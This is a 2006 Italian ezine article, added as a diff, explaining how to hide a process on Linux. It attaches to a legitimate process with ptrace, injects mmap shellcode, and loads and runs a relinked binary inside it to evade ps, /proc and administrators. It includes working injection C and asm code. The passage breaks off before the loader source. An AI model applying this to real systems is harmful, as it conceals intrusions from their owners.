@@ -1,0 +1,1400 @@
+================================================================================
+---------------------[ BFi14-dev - file 03 - 21 sep 2006 ]----------------------
+================================================================================
+---[ SYMBi0TiC PR0CESS EXECUTi0N ]----------------------------------------------
+-----[ sbudella at gmail dot com ]----------------------------------------------
+
+
+***** Sommario.
+
+- Intro;
+- Ritorno a Userlandia;
+- Noi due dobbiamo stare vicini vicini;
+- A sys_call to kill for;
+- Il continuum di Aleph1 and locale affairs;
+- Linking sovversivo;
+- A cruel taste of C code - Conclusioni;
+- Greetings;
+- Riferimenti.
+
+***** Intro.
+
+Attualmente il concetto di process hiding su sistemi Unix ha raggiunto il
+suo stato d'arte con l'implementazione di tecniche che prevedono, nei casi
+piu' fruttuosi, l'utilizzo di moduli a kernel space: i rinomati lkm.
+E' pratica molto comune quella di filtrare l'output di programmi quali ps(1),
+top(1) ecc, e nasconderne le parti piu' compromettenti, ma come tutti sanno
+non e' molto difficile per un sistema di detecting scovare eventuali anomalie
+di questo genere. Una tecnica molto efficace invece, e' quella illustrata da 
+Dark-Angel su BFi-11[1] che tra le altre cose fornisce interessanti spunti su 
+cui riflettere attentamente; infatti l'autore mostra quale sia la condizione 
+sufficiente (ma non necessaria) per l'esecuzione di un processo su una macchina
+unix: la sys_call execve(2). Quello che in pratica succede nel sistema quando
+un programma viene eseguito e' noto a tutti, ma vorrei sottolineare il fatto
+che utilizzando la maggior parte delle suddette tecniche non possiamo
+prescindere dalla execve e cio' ha implicazioni importanti: la task_struct
+del kernel conterra' sempre le informazioni relative al nostro processo, e
+seppur utilizzassimo la tecnica di Dark-Angel, il proc filesystem non
+esiterebbe a mostrarcele, rendendo cosi' necessario un opportuno wrapper per
+l'output di ps&co (nel caso del filtering) o hooking delle sys_call implicate
+e siamo di nuovo al punto di partenza; inoltre, sebbene l'hacking a kernel land
+puo' essere molto potente e trasparente, esiste sempre una remota possibilita'
+di infierire sulla stabilita' del sistema. Per non parlare del fatto che spesso
+possiamo trovare situazioni in cui non e' attivo il supporto per i moduli,
+e abbiamo /dev/kmem in sola lettura... ma questa e' un'altra storia.
+Quindi mi pare evidente che la limitazione piu' grande a questo tipo di
+problema sia proprio la sys_execve; quando prima dicevo che il suo utilizzo
+risulta essere sufficiente ma non necessario mi riferivo al fatto che possiamo
+scegliere altre strade in merito: questo articolo cerchera' di mostrare un
+nuovo tipo di approccio al problema che fa semplicemente a meno della execve
+per l'esecuzione di un programma, rendendo piu' agevole l'hiding dei processi
+e, cosa da non sottovalutare, facendoci evitare di sporcare le mani a kland.
+
+***** Ritorno a Userlandia.
+
+In verita' implementazioni del genere esistono gia': basti pensare a 
+Userland Exec[2] di the grugq che svolge egregiamente il lavoro. L'idea e'
+al tempo stesso geniale e semplice, infatti ul_exec non fa altro che emulare
+per conto suo il comportamento di una sys_execve che, come si legge nella
+documentazione dell'autore, e' in parole povere questo: 
+
+- Ripulisci lo spazio di indirizzamento;
+- Carica il dynamic linker se necessario;
+- Carica il binario;
+- Crea lo stack;
+- Determina l'entry point ed esegui il binario.
+
+A questo punto penserete che e' possibile accontentarsi di tutto cio', ed in
+effetti mi sembra davvero una implementazione esauriente e completa. Pero'
+vorrei azzardare che in un certo senso e' piu' di questo, perche' agli occhi
+di un pigro come il sottoscritto, i primi quattro punti sono addirittura 
+superflui. Pensateci un attimo. Tutti i programmi in esecuzione 
+necessariamente hanno dovuto seguire i 5 punti di cui sopra, quindi senza
+ombra di dubbio ogni processo in memoria avra' il suo spazio di indirizzamento
+gia' pulito, il proprio stack ed altro ancora. Ebbene la mia proposta consiste
+in questo: possiamo utilizzare all'occorenza quanto gia' disponibile per gli
+altri processi legittimi (stack, address space, ecc) ai nostri fini, ovvero
+al posto di creare un altro spazio di memoria per il nostro processo possiamo
+momentaneamente impadronirci di quello di un altro, di una vittima, scelta
+ad hoc. Ed in questo caso i due processi vivrebbero per il tempo necessario in
+simbiosi, condividendo lo spazio di memoria e soprattutto e ripeto
+_soprattutto_ condividendo il nodo relativo nella task_struct e di conseguenza
+l'entry nel proc filesystem... e tutto questo in user space. Dunque come
+mostrero' di seguito, faremo del tutto a meno di sys_execve.. o meglio non
+proprio del tutto...
+
+***** Noi due dobbiamo stare vicini vicini.
+
+Il mio piano provvisorio e' abbastanza semplice: se the grugq reimplementava
+execve da zero, noi scegliamo un processo innocuo che avra' gia' passato ogni
+test di sicurezza e quindi sara' legittimo, ci attacchiamo ad esso in modo 
+molto discreto, ripuliamo lo spazio di indirizzamento e ci inseriamo
+tutto il codice del nostro binario da eseguire. In pratica:
+
+- Attaccati ad un processo legittimo;
+- Ripulisci il suo spazio di memoria;
+- Apri il binario da nascondere;
+- Inserisci il codice del binario nello spazio di memoria;
+- Vai all'entry point ed esegui;
+
+A pensarci bene il secondo punto e' abbastanza discutibile, abbiamo in merito
+un sacco di possibilita'. Ma prima e' necessaria una infarinatura generale
+riguardo a cose che ci serviranno in seguito. Ad ogni processo in esecuzione
+e' associato un file nella sua entry in /proc di nome maps; questo file
+altro non e' che un l'elenco di tutte le regioni di memoria mappate ed 
+utilizzate dal processo in questione, contenente anche i permessi ad esse
+relativi. Come si legge nella pagina di manuale di proc, il formato del file
+maps e' questo:
+
+address           perms offset  dev   inode      pathname
+08048000-08056000 r-xp 00000000 03:0c 64593      /usr/sbin/gpm
+
+Per quanto riguarda i permessi basta dire che oltre ai classici rwx qui si 
+aggiungono p = private e s = shared. Se abbiamo r-xp di solito si tratta di uno
+spazio di memoria eseguibile e quindi non e' presente il permesso di scrittura
+per evitare di creare problemi. E' necessario dire inoltre che la grandezza 
+delle regioni mappate e' sempre un multiplo di PAGESIZE.
+Bene, ora provate a leggere il file maps di un processo a scelta:
+
+sbudella@hannibal:~$ cat /proc/2108/maps 
+08048000-08058000 r-xp 00000000 03:02 326        /bin/ed
+08058000-08059000 rw-p 00010000 03:02 326        /bin/ed
+08059000-0805c000 rwxp 00000000 00:00 0 
+40000000-40014000 r-xp 00000000 03:02 12032      /lib/ld-2.3.2.so
+40014000-40015000 rw-p 00013000 03:02 12032      /lib/ld-2.3.2.so
+40015000-40017000 rw-p 00000000 00:00 0 
+40020000-40148000 r-xp 00000000 03:02 12066      /lib/libc-2.3.2.so
+40148000-4014c000 rw-p 00128000 03:02 12066      /lib/libc-2.3.2.so
+4014c000-4014f000 rw-p 00000000 00:00 0 
+4014f000-4017b000 r--p 00000000 03:02 64896      /usr/lib/locale/en_US/LC_CTYPE
+bfffe000-c0000000 rwxp fffff000 00:00 0 
+
+Come potete vedere le prime due regioni riguardano rispettivamente il segmento
+codice e dati, in piu' si notano benissimo il dynamic linker e le librerie di
+sistema. Ma un momento: cosa sono quelle regioni con offset, device e inode 
+uguale a zero? Si tratta di spazio libero allocato dal programma (di solito) 
+che possiamo benissimo utilizzare ai nostri scopi per inserire il binario
+da nascondere. Come vedete lo spazio non e' neanche esiguo e quindi potremmo
+sbizzarrirci. Da parte mia, ho scelto di seguire un'altra strada (illustrata
+successivamente), forse un po' meno immediata ma sicuramente piu' remunerativa,
+poiche' non sempre lo spazio a disposizione puo' essere sufficiente. Comunque
+sia e' d'obbligo considerare questa prima tattica. Quindi come abbiamo visto
+possiamo fare anche a meno di ripulire lo spazio di memoria della vittima, che
+avrebbe comportato un salvataggio preventivo di tutta quell'area dati che 
+eventualmente avremmo utilizzato. Ma adesso sorge spontanea una domanda:
+stiamo progettando a tutti gli effetti un loader che emuli le caratteristiche
+di base di execve (senza seguire il piano di ul_exec) ma come facciamo ad
+agganciarci ad un processo esistente e condividere simbioticamente il suo 
+spazio di memoria senza lavorare in kernel space? Come spero tutti avranno
+intuito, ci serviremo di ptrace(2).
+
+***** A sys_call to kill for. 
+
+Ebbene, di ptrace oramai se n'e' parlato un po' ovunque[3][4] e con un po' di
+fantasia si puo' fare qualsiasi cosa senza discendere negli inferi del kernel 
+space. Infatti possiamo intercettare chiamate di sistema di un programma,
+leggerne l'area dati, bloccarne l'esecuzione e farla proseguire step by step
+come succede con gdb ecc.. Ma la cosa piu' importante e' che possiamo inserire
+del codice direttamente nel flusso di esecuzione di un processo. Vediamo subito
+un esempio facile facile dell'uso di ptrace che introduce un concetto utile
+per chi crede che sia possibile risolvere il nostro caso semplicemente 
+iniettando nel program flow tutto il codice del binario da nascondere...
+
+<-| spe/ptrace01.c |->
+/*========== 
+==	using ptrace example;
+==	sbudella 2006;
+==========*/  
+
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <unistd.h>
+#include <linux/user.h>
+
+#define	BSIZE		256
+
+void get_data(pid_t child,long addr,long *str,int len);
+void put_data(pid_t child,long addr,void *vptr,int len);
+int dumpme(void (*fptr));
+void spaghetti();
+
+char *shellcode;
+
+int main(int argc,char *argv[])
+{
+	int len = dump_code(spaghetti);
+	pid_t child = atoi(argv[1]);
+	struct user_regs_struct regs; 
+	long backup[len];
+
+	ptrace(PTRACE_ATTACH,child,NULL,NULL);
+	wait(NULL);
+
+	ptrace(PTRACE_GETREGS,child,NULL,&regs);		
+
+	printf("iniecting shellcode\n");
+	get_data(child,regs.eip,backup,len);
+	put_data(child,regs.eip,shellcode,len);
+
+	ptrace(PTRACE_SETREGS,child,NULL,&regs);
+	ptrace(PTRACE_CONT,child,NULL,NULL);
+
+	wait(NULL);
+
+	printf("restoring execution\n");
+	put_data(child,regs.eip,backup,len);
+
+	ptrace(PTRACE_SETREGS,child,NULL,&regs);					
+	ptrace(PTRACE_DETACH,child,NULL,NULL);
+
+
+	return 0;
+
+}
+
+void get_data(pid_t child,long addr,long *str,int len)
+{
+	int i = 0;
+
+	while(i < len) 
+		str[i++] = ptrace(PTRACE_PEEKDATA,child,addr + i * 4,NULL);
+
+//	str[len] = '\0';
+
+}
+
+void put_data(pid_t child,long addr,void *vptr,int len)
+{
+       	int i , count;
+       	long word;
+
+	i = count = 0;
+
+	while (count < len) {
+		memcpy(&word , vptr+count , sizeof(word));
+		word = ptrace(PTRACE_POKETEXT, child , \
+			addr+count , word);
+		count +=4;
+	}
+}
+
+int dump_code(void (*fptr))
+{
+        int t;
+        char buf[BSIZE],*k;
+        char *s = (char *) fptr;      
+
+        memset(buf,0,BSIZE);
+        k = memccpy(buf,s,0xc3,BSIZE);          /* man memccpy; 0xc3 is the opcode for the ret instruction */
+
+        t = k - buf - 3;	/* 3 is for the stack prelude */ 
+
+        shellcode = (char *)malloc(t);
+	memset(shellcode,0,t);
+        memcpy(shellcode,&buf[3],t);
+
+	return t;
+
+}
+
+/* write a string using the old good aleph1's method */
+void spaghetti()
+{
+	__asm__("jmp forw");
+	__asm__("back: ");
+	__asm__("popl %esi");
+	__asm__("movl $0x4,%eax");
+	__asm__("movl $0x2,%ebx");
+	__asm__("movl %esi,%ecx");
+	__asm__("movl $9,%edx");
+	__asm__("int $0x80");
+	__asm__("xor %eax,%eax");
+	__asm__("inc %eax");
+	__asm__("int $0x80");
+	__asm__("forw: ");
+	__asm__("call back");
+	__asm__(".string \"HELLO!!!\\n\"");
+	
+}
+
+<-X->
+
+Bene. Come avrete capito, get_data() e put_data() sono le funzioni che si 
+occupano di leggere ed iniettare codice nel processo in esecuzione. Quello che
+succede nel main() e' che ci attachiamo al processo con PTRACE_ATTACH, poi
+chiediamo di leggere tramite PTRACE_GETREGS lo stato dei registri del
+programma; quando passate questo argomento a ptrace e' necessario che passiate
+anche la user_regs_struct: e' proprio in questa struttura che verra'
+memorizzato lo stato dei registri (comunque date una sbirciata a
+/usr/include/asm/user.h per saperne di piu'). La parte cruciale e' che facciamo
+prima un backup delle istruzioni successive a regs.eip (si', l'instruction
+pointer della vittima) per poi iniettare il codice con put_data, cosi' da
+ripristinarne l'esecuzione una volta terminata quella del codice inserito. Ma
+un momento... che cosa abbiamo iniettato esattamente nella vittima? Abbiamo
+iniettato il codice della funzione spaghetti() che altro non fa che stampare
+una stringa a video. La funzione di nome dump_code infatti si occupa di
+riempire il buffer da iniettare a partire dall'indirizzo di memoria di
+spaghetti, evitandone il prologo e fermandosi alla comparsa dell'istruzione
+ret (il suo opcode e' 0xc3).
+Ultima cosa prima di andare avanti: avrete certamente visto che il codice da
+iniettare e' stato scritto con la tecnica jmp/call del mito Aleph1: ecco dunque
+che non possiamo inserire selvaggiamente qualsiasi codice nel flusso di
+esecuzione (ne' nello spazio vuoto), a meno di non incappare in un acrobatico
+segmentation fault. D'altro canto non possiamo neanche pensare di riscrivere il
+programma da nascondere in versione jmp/call style... ma penso che questa idea
+non e' venuta in mente neanche al piu' pazzo tra i presenti ;-D
+
+***** Il continuum di Aleph1 and locale affairs.
+
+Le cose da fare a questo punto sono ancora tante. Ma tanto vale rielaborare un
+po' il nostro piano. Abbiamo detto che non utilizzeremo lo spazio vuoto della
+vittima per nascondere il binario; possiamo agganciarci a qualsiasi processo
+che non sia init; possiamo iniettare nel flusso di esecuzione della vittima
+qualsiasi codice coerente con il suo spazio di indirizzamento, ovvero possiamo
+inserirvi uno shellcode codato con la tecnica di Aleph1 oppure PIC(position
+independent code). Bene. Adesso possiamo iniziare a pensare ad un posto dove
+posizionare il codice dell'elf binary. Io non vedo altra possibilita' che
+quella di creare una nuova regione della dimensione voluta nello spazio di
+indirizzamento del target e l'unico modo per farlo e' usare mmap(2).
+Quindi lo shellcode da iniettare nel program flow dovra' mmappare il binario
+nello spazio di memoria della vittima. Prima di buttarci sul codice asm, e'
+importante dire alcune parole su delle accortezze che dobbiamo prendere. 
+Dato che dobbiamo programmare in asm recuperiamo il numero di sys_call di
+mmap che, per chi non lo sapesse ancora, andremo a mettere in %eax.
+E' il 90; in %ebx ci va una struttura dati un po' particolare, la
+mmap_arg_struct. Sbirciamo nei sorgenti del kernel e vediamo che in
+arch/i386/kernel/sys_i386.c ce la troviamo di fronte:
+
+struct mmap_arg_struct {
+     unsigned long addr;
+     unsigned long len;
+     unsigned long prot;
+     unsigned long flags;
+     unsigned long fd;
+     unsigned long offset;
+};
+
+che ovviamente dovremo tradurre in asm. Altra notevole accortezza, forse la
+piu' importante: il membro della mmap_arg_struct fd e' il file descriptor che
+e' necessario passare a mmap; ora se mappiamo direttamente il binario passando
+ad mmap il fd dopo averlo ovviamente aperto, chiunque si accorgerebbe di cosa
+sta succedendo: basterebbe infatti controllare il /proc/pid/maps della vittima
+e leggere il pathname per capire che c'e' un file in simbiosi. Cosa fare
+dunque? Un'occhiata distratta al man di mmap ci informa che e' disponibile
+l'argomento MAP_ANON da passare insieme agli altri nel membro flags. In questo
+caso mmap ignorerebbe il fd e l'offset per il mapping e si limiterebbe a
+mmappare per noi /dev/zero, scrivendo il suo insospettabile pathname nel
+/proc/pid/maps.
+Cosi' facendo pero' dovremo comunque aprire il binario, leggerne il codice e
+copiarlo nell'indirizzo restituito da mmap, dopotutto un male minore. 
+Bene, per quanto riguarda gli altri membri struttura: addr va lasciato a zero
+per informare mmap di darci il primo spazio disponibile; len e' la dimensione
+della regione da allocare; prot va settato a rwx. Ecco qui un esempio:
+
+<-| spe/page.asm |->
+;;;;;;;;;; a stupid mmap asm code using the Aleph1 jmp/call method 
+;;;;;;;;;; nasm -f elf page.asm
+;;;;;;;;;; ld -o page page.o
+;;;;; sbudella 2006
+
+section .text
+global _start
+
+_start:
+	jmp	mmap_arg_struct	
+bw01:
+	pop	esi
+	mov	eax,0x5a	; sys_mmap
+	mov	ebx,esi
+	int	0x80
+	cmp	eax,0		; MAP_FAILED ?
+	jle	END
+
+; endless loop to let the user check /proc/pid/maps
+LP:
+	jmp	LP
+
+END:
+	xor	eax,eax
+	inc	eax
+	int	0x80
+
+mmap_arg_struct:
+	call	bw01
+args:
+	dd	0		; addr
+	dd	0x1000		; len	
+	dd	7		; prot = PROT_READ | PROT_WRITE | PROT_EXEC
+	dd	0x21		; flags = MAP_SHARED | MAP_ANON
+	dd	0		; ignored
+	dd	0		; ignored
+
+<-X->
+
+Adesso vediamo cosa succede nel /proc/pid/maps:
+
+sbudella@hannibal:~$ ps au | grep page
+sbudella  1590 96.3  0.0    12    8 pts/1    R+   18:37   0:10 ./page
+sbudella  1604  0.0  0.1  1672  580 pts/2    S+   18:37   0:00 grep page
+sbudella@hannibal:~$ cat /proc/1590/maps 
+08048000-08049000 r-xp 00000000 03:02 1325       /home/sbudella/page
+40000000-40001000 rwxs 00000000 00:04 1274       /dev/zero (deleted)
+bffff000-c0000000 rwxp 00000000 00:00 0 
+
+Come potete osservare, il codice ha mappato per noi una regione della
+dimensione desiderata completamente ripulita, ed il pathname e' assolutamente
+innocuo (/dev/zero). Naturalmente poi dobbiamo aprire il binario e ricopiarlo a
+partire dall'indirizzo che mmap ci restituisce. Il nuovo piano allora prevede:
+
+- Attaccati ad un processo esistente;
+- Inietta nel suo flusso di esecuzione il codice che allochera' una nuova
+  regione usando mmap (con le accortezze viste in precedenza);
+- Copia il binario da nascondere nella nuova regione;
+- Usa l'indirizzo della nuova regione come %eip;
+- Salta al nuovo %eip ed esegui il binario.
+
+Ovviamente gli ultimi tre punti sono ancora da discutere, perche' come qualcuno
+avra' gia' intuito c'e' un discorso da fare sul linking. Ma procediamo per
+gradi. Abbiamo visto che il nuovo indirizzo e' di vitale importanza per i
+nostri scopi, ed infatti qui c'e' da fare un piccolo intercalare (come vedete
+le complicazioni non finiscono mai). Per prima cosa, come avrete modo di notare
+leggendo il source del programma finale, non possiamo far comunicare il 
+codice asm che iniettiamo nella vittima con il nostro loader, di modo che 
+diventa quasi impossibile scoprire quale sia l'indirizzo restituito da mmap.
+Mi spiego. La funzione da iniettare, spaghetti(), che si occupera' di fare il
+mmapping, non puo' comunicare con il main() del nostro loader, a meno che non
+facciamo ricorso a variabili globali, cosa inutile perche' spaghetti()
+deve lavorare nello spazio di memoria della vittima e quindi fallirebbe nel
+trovare qualsiasi riferimento esterno. Come fare, allora, per avere notifica
+dell'indirizzo di mmap? Niente panico qui, ci viene in soccorso la scienza
+sperimentale: dopo infinite sessioni di prova ho potuto constatare, senza
+tuttavia capirne il motivo ;-D, che gli indirizzi restituiti da mmap si
+riducono a due tipologie. Se il programma vittima ha allocato spazio per
+/usr/lib/locale/* e spazzatura affine, il nostro indirizzo, se la regione da
+mmappare e' abbastanza esigua, si trovera' subito dopo lo spazio dedicato alla
+mappatura di /usr/lib/locale/en_US/LC_CTYPE (approfitto per dire che i test
+sono stati fatti su Linux 2.4.26 Slackware 10, quindi fatemi sapere se cambia
+qualcosa sugli altri sistemi). Se invece la vittima non ha tutte quelle
+informazioni (/usr/lib/locale) mappate, il nostro fido mmap ci restituira' 
+l'indirizzo adiacentemente alla seconda occorrenza di spazio vuoto, ovvero 
+quella con rw-p come protezione. Mentre nell'ipotesi in cui la regione da 
+allocare sia bella grande (>= 0x10000 byte) vale la legge del primo caso. 
+Cosa voglio dire con questo? Beh, non possiamo comunicare direttamente
+con spaghetti(), ma possiamo sempre leggere il /proc/pid/maps della vittima e,
+in base alle nostre osservazioni pseudo-naturalistiche possiamo prevedere con
+certezza quasi matematica dove mmap andra' a mmappare la nostra regione di 
+memoria. Tutto questo discorso sul guessing ovviamente e' valido nel caso
+in cui sia accessibile in lettura il /proc/pid/maps e in ambienti con kernel
+2.4.* ; infatti nel 2.6 il layout di memoria cambia e possiamo incappare nella
+eventualita' di un mmapping randomizzato. In questi casi conviene adottare la
+seguente soluzione (credits: BFi staff): dopo aver iniettato il codice nel
+program flow del target, facciamo una chiamata a ptrace con PTRACE_SYSCALL,
+e successivamente otteniamo il numero di sys_call eseguita utilizzando 
+PTRACE_PEEKUSER; se corrisponde a quello di mmap, il 90, allora eseguiamo
+ancora un'altra chiamata PTRACE_SYSCALL ed otteniamo il valore di ritorno
+della funzione, ovvero l'indirizzo di nostro interesse. In seguito possiamo
+far procedere l'esecuzione del nostro shellcode con PTRACE_CONT.
+
+***** Linking sovversivo.
+
+Dopo aver risolto un problema, ne sorge immediato un altro. Ora possediamo 
+l'indirizzo al quale far saltare l'esecuzione del programma vittima dopo aver
+copiato tutto il nostro binario elf. Ma a nessuno e' venuta in mente la
+sfacciata possibilita' di un pornografico segmentation fault? Direi che le
+condizioni sono quelle ottimali: infatti, se noi abbiamo copiato il nostro elf
+nello spazio appena mappato, bastera' che questo faccia un riferimento ad una
+qualsiasi parte del suo spazio di indirizzamento per fallire miserabilmente
+facendo invece riferimento allo spazio della vittima. Esempio:
+
+...
+mov	eax,dword mess	; mettiamo in eax l'indirizzo di mess = 0x80490ca 
+...
+
+Il programma andra' si a referenziare mess in 0x80490ca, ma nello spazio della
+vittima perche' i suoi indirizzi ora sono tutti slittati, causa la mappatura
+che abbiam fatto. Che fare dunque? Beh, prima di arrenderci direi che abbiamo
+ancora una chance per cercare di completare i nostri obiettivi di sopravvivenza
+simbiotica. La soluzione piu' semplice che mi e' venuta in mente e' quella di
+un linkaggio del binario da nascondere in modo da rispecchiare il nuovo spazio
+di indirizzamento. Se date una piccola occhiata alla entry info di ld (il
+linker del progetto GNU) vi accorgerete che si tratta di una cosa semplice.
+Per chi non lo sapesse, il linker ld offre la possibilita' di creare degli 
+script che non fanno altro che guidare il processo di linking; questi script
+sono scritti con il linker command language e persino il linkaggio di un comune
+programma compilato con gcc utilizza al meglio script piu' o meno complessi.
+Senza entrare troppo nel dettaglio e scrivere inutili rifacimenti al manuale di
+ld, dico che lo scopo di uno script e' semplicemente quello di dire al linker
+come le singole sezioni di un elf devono essere mappate, determinando quindi
+una particolare configurazione in memoria. Inoltre ogni script e' composto da
+una successione di comandi, tra i quali il piu' importante e' sicuramente
+SECTIONS. Con questo comando diciamo al linker che determinate sezioni di un
+object file avranno un determinato virtual memory address. Ebbene mi pare sia
+proprio quello che stavamo cercando: utilizzeremo l'indirizzo del nostro nuovo
+spazio di indirizzamento come il nuovo entry point del binario e tutte le
+sezioni successive (.data, .bss) dovranno essere accodate alla .text section.
+Mi pare ovvio che il loader debba essere in grado di rintracciare l'object file
+del binario, cosi' da linkarlo al volo. Dato che non possiamo riscrivere da
+zero uno script per ld, modificheremo quello di default alle nostre esigenze.
+Lo script in questione e' ottenibile tramite 'ld --verbose', diamo un'occhiata:
+
+...
+SECTIONS
+{
+  /* Read-only sections, merged into text segment: */
+  /* sbudella> 0x08048000 e' l'indirizzo di default al quale il linker
+     associa nella maggior parte delle volte l'entry point in questo modo:
+	entry_point = 0x08048000 + 0x80;
+     dobbiamo semplicemente fare in modo che il nostro loader, dopo aver
+     ottenuto l'indirizzo K della regione mmappata, determini il nuovo 
+     entry point seguendo questo schema:
+	entry_point = K - 0x80; */
+  PROVIDE (__executable_start = 0x08048000); . = 0x08048000 + SIZEOF_HEADERS;
+...
+
+Per quanto concerne il calcolo dell'entry point, facciamo riferimento alla
+specifica ELF[5] che a riguardo ci dice che il .text segment, caricato in 
+memoria, viene preceduto da un padding di 0x100 bytes contenente l'elf header
+completo, la program header table e altre informazioni; nel nostro caso si
+tratta solo di 0x80 byte perche' stiamo considerando degli elf di esigua 
+costituzione, ovvero molto piccoli, senza il supporto di libc e quindi con
+una program header table ridotta (seguendo l'operazione successiva infatti,
+non abbiamo che un solo program header). Quello che voglio dire e' che comunque
+il valore puo' cambiare, addirittura con programmi compilati con gcc l'entry
+point puo' slittare di molti byte dalla posizione di default, quindi mano
+al sorgente, man readelf e vedete un po' voi...
+Ora vediamo come le singole sezioni vengono sistemate nel linking di default:
+
+...
+  /* sbudella> come si puo' vedere, la sezione .fini viene accodata a .text..*/
+.text           :
+  {
+    *(.text .stub .text.* .gnu.linkonce.t.*)
+    /* .gnu.warning sections are handled specially by elf32.em.  */
+    *(.gnu.warning)
+  } =0x90909090
+  .fini           :
+  {
+    KEEP (*(.fini))
+  } =0x90909090
+...
+...
+  /* Adjust the address for the data segment.  We want to adjust up to
+     the same address within the page on the next page up.  */
+  /* sbudella> ...mentre il data segment viene allineato secondo PAGESIZE */
+  . = ALIGN (0x1000) - ((0x1000 - .) & (0x1000 - 1)); . = DATA_SEGMENT_ALIGN (0x1000, 0x1000);
+...
+
+Tutto cio' non va affatto bene. Come ho detto, dobbiamo fare in modo che il 
+.text segment e il .data segment (e anche .bss) risultino accodati, di modo 
+che possiamo leggere il binario e ricopiarlo di netto nello spazio di memoria
+senza mappare un'altra regione per il segmento dati. Il compito da svolgere e'
+di una semplicita' disarmante: bastera' aggiungere solo un paio di righe nello
+script di default, come mostra la modalita' seguente:
+
+... 
+  .text           :
+{
+	*(.text .stub .text.* .gnu.linkonce.t.*)
+	*(.gnu.warning)
+ } =0x90909090
+/* sbudella> ecco qui la modifica apportata: diciamo al linker di accodare
+   tutto quello che riguarda la .data section alla .text... */ 
+.data : { *(.data) }
+/* sbudella> ...e la .bss subito dopo la .data section. */
+.bss : { *(.bss) }
+  .fini           :
+  {
+    KEEP (*(.fini))
+  } =0x90909090
+...
+
+Ed eccoci accontentati. Non dovrebbero esserci complicazioni di sorta. Tutto
+questo lavoro naturalmente e' compito del loader. Una nota ulteriore: su 
+sistemi che utilizzano patch di sicurezza quali PaX, sotto la vigilante tutela
+di GRsecurity, e' necessario un altro tipo di approccio. Come e' risaputo,
+in queste situazioni alle regioni da mappare vengono assegnate solamente le
+protezioni (permessi) necessarie al corretto funzionamento del processo, e 
+nient'altro: un'area per il segmento .text disporra' di conseguenza solo di
+r-x, mentre .data avra' protezione rw-, ecc. E' evidente che quanto detto sulla
+modifica dello script del linker non va bene in questo caso. Tuttavia per
+noi e' indispensabile che tutte le aree di mmapping abbiano, almeno 
+inizialmente, il permesso di scrittura attivo, poiche' dobbiamo pur sempre 
+copiare il codice del binario. Per aggirare questo problema potremmo ricorrere
+a mprotect(2): dopo aver copiato il necessario nelle regioni appena mmappate,
+possiamo riconfigurare le protezioni ad esse relative:
+
+mmap ==> .text = rwx <==> mprotect(..., ..., PROT_READ | PROT_EXEC);
+
+Di conseguenza dovremmo fare il mmapping di ogni singola sezione (almeno .text
+e .data) e rendere cosi' separati i rispettivi segmenti. In ogni caso si tratta
+di semplici modifiche che non dovrebbero costare molta fatica al lettore: al 
+codice di injection va aggiunta qualche riga per fare un mmap per .data e 
+.text segment rispettivamente, e una sola chiamata a mprotect per
+riassettare i permessi della regione del .text segment. Lo script del linker
+va invece modificato solo nella parte riguardante l'entry point, in quanto
+la disposizione di default delle elf section, nel caso Pax, ci sta piu' che
+bene. Chiusa questa parentesi, ed in base a quanto riferito sul linking, 
+possiamo certamente abbozzare un approccio preliminare per la nostra tecnica:
+
+- Attaccati ad un processo esistente;
+- Con il metodo sperimentale determina l'indirizzo al quale verra' mmappato
+  il nuovo spazio (oppure ricorri a PTRACE_SYSCALL + PTRACE_PEEKUSER);
+- Ottieni lo script di default del linker ld, modifica l'entry point e fai
+  in modo che .text, .data e .bss section risultino adiacenti; 
+- Fai 'on the fly' il linking dell'object file del binario da nascondere;
+- Inietta nel flusso di esecuzione della vittima il codice per mmappare
+  il nuovo spazio di memoria, apri il binario appena linkato, leggi a
+  partire dall'elf entry point, copia il codice nella regione appena mappata;
+- Utilizza come nuovo valore di %eip l'indirizzo del nuovo spazio;
+- Esegui il binario.
+
+Direi che possiamo fare di meglio. Effettivamente, facendo puntare l'instruction
+pointer al nuovo indirizzo otteniamo l'indesiderabile effetto di bloccare il
+processo vittima: dovremo forzatamente attendere (wait(NULL)) che il nostro
+binario termini la sua esecuzione per restituire il controllo all'host, e tutto
+questo e' un lusso che non possiamo concederci; un sistema sapientemente
+amministrato potrebbe rilevare questo comportamento anomalo, soprattutto se la
+nostra vittima e' un demone di sistema come crond. Possiamo rendere il nostro
+approccio ancora piu' simbiotico implementando una gestione asincrona della
+esecuzione, rispettivamente di target e binario nascosto (credits: BFi staff).
+Sul nostro sistema abbiamo la possibilita' di definire un'azione specifica a
+seconda di determinati segnali, utilizzando sigaction(2) o signal(2): la scelta
+ricade su SIGUSR1 ovvero, dal codice di injection installiamo un nuovo handler
+per il segnale specificato. Se date uno sguardo a come lavora signal(2), potete
+notare che per il segnale indicato dobbiamo passare un puntatore a funzione, o
+meglio un indirizzo di memoria, che nel nostro caso dovra' essere proprio quello
+restituito da mmap, nonche' l'indirizzo della nostra area mmappata. Di questo
+passo, la vittima continuera' a svolgere il suo lavoro consueto anche dopo
+l'injection, ma non appena riceve il SIGUSR1 si adoperera' a restituire il 
+controllo al nostro binario mappato. Una soluzione davvero elegante, a mio
+avviso. Naturalmente dovremo preventivamente accertarci di non sovrascrivere
+nessun handler gia' impostato per la vittima, per evitare di creare scompiglio:
+ogni chiamata a signal restituisce come valore di ritorno l'indirizzo
+dell'handler precedentemente installato, oppure valore nullo nel caso l'handler
+sia quello di default (SIG_DFL); quindi prima di installare il nostro
+ci accertiamo con una chiamata a signal (con %ecx = 0 per non sortire nessun 
+effetto) che la vittima abbia l'handler di default per SIGUSR1. Successivamente
+proseguiamo ad impostare il nostro indirizzo come descritto in precedenza. 
+Nell'eventualita' in cui ci fosse gia' un non default handler, tentiamo la 
+soluzione definita prima: facciamo puntare %eip alla nuova area di memoria.
+Come vedete, facciamo di tutto per far eseguire il nostro binario.
+A questo punto direi che ci siamo. Vi andrebbe un po' di codice?
+
+***** A cruel taste of C code - Conclusioni. 
+
+Ecco il sorgente del loader venom. Naturalmente non aspettatevi niente di
+performante al 100%, ma il tutto dovrebbe funzionare perfettamente: il
+programma compie bene il suo dovere, sebbene siano necessarie alcune modifiche
+per caricare degli elf binary belli grossi (naturalmente -static ;-). Infatti,
+come dicevo prima, la sistemazione delle sezioni cambia in presenza della 
+libreria C standard, ed il gcc fa un po' quello che gli pare in materia di
+linking (la verita' e' che sono troppo svogliato per approfondire ;-D)...
+Il programma accetta dalla riga di comando il pid della vittima da attaccare
+e cio' basta per far partire il loader in modalita' default, ovvero otteniamo
+l'indirizzo della regione mmappata tramite guessing. Per evitare il guessing
